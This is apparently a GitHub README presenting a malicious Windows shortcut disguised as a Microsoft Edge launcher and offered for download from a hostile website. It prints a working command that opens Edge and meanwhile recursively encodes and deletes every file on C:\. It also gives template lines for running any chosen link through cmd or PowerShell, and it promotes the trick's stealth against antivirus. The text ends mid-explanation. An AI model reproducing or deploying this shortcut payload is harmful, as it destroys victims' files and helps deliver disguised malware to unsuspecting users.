

Concept of gaining access to a shell through a stealthy executable:



People usually think viruses are hidden in the file you run, slipped into the code and encripted to stay hidden. This one does not. It hides in plain sight but can do just as much damage. For example, if someone was to navigate to a maliscious website to download and then run a file on their machine, they wouldn't notice anything was wrong with the file. Their antivirus might not catch that the file properties have been modified to run whatever it wants in the terminal. 

Lets say the website has a microsoft edge shortcut for download. The website visitor downloads the inesent looking file and opens it.

 The file look like this when downloading:

![alt text](https://github.com/Destroyer7s/DangerFiles/blob/main/shell%20by%20properties/Download.png)


And this in the Windows file system:

![alt text](https://github.com/Destroyer7s/DangerFiles/blob/main/shell%20by%20properties/Microsoft_Edge.png)


It's not until you look closer that you see what it can really do:

![alt text](https://github.com/Destroyer7s/DangerFiles/blob/main/shell%20by%20properties/Shortcutcode.png)

When you execute the shortcut, the following command is run:

```bash
C:\Windows\System32\cmd.exe /k "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" && cd c:\ && forfiles /S /M * /c "cmd /c certutil -encode -f @file @fname.l && findstr /v CER @fname.l > @fname.d && del @file && del @fname.l"
```
It can be seperated to view each command seperatly:

```bash
C:\Windows\System32\cmd.exe /k "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" && 
cd c:\ && 
forfiles /S /M * /c "cmd /c certutil -encode -f @file @fname.l && findstr /v CER @fname.l > @fname.d && del @file && del @fname.l"
```
This command allows edge to launch while encripting your files in the background. And this is only the begining!

we can change the script that run to be anything we want:

```bash
C:\Windows\System32\cmd.exe /k "ENTER_LINK_HERE"
```
Or just:

```bash
powershell start ENTER_LINK_HERE
```



How are we able to achieve this? Through the way Windows treats shortcut files. Here we see where the payload is stored:









